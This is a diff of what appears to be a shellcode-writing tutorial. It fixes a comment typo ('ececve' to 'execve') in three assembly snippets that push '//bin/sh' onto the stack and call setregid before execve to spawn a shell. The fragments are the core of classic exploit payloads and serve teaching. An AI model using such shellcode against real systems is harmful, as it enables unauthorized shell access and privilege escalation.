@@ -79,7 +79,7 @@ one time, and our string is only 7 bytes. In order to rectify this, we can add a
 We also need to push our null byte. 
 
 ```gas
-    // ececve("/bin/sh", 0, 0)
+    // execve("/bin/sh", 0, 0)
     push $0
     push $0x68732f6e
     push $0x69622f2f
@@ -120,7 +120,7 @@ main:
     mov $SYS_setregid, %eax
     int $0x80
 
-    // ececve("/bin/sh", 0, 0)
+    // execve("/bin/sh", 0, 0)
     push $0
     push $0x68732f6e
     push $0x69622f2f
@@ -164,7 +164,7 @@ main:
     mov $SYS_setregid, %rax
     syscall
 
-    // ececve("/bin/sh", 0, 0)
+    // execve("/bin/sh", 0, 0)
     mov $0, %rax
     push %rax
     mov $0x68732f6e69622f2f, %rax
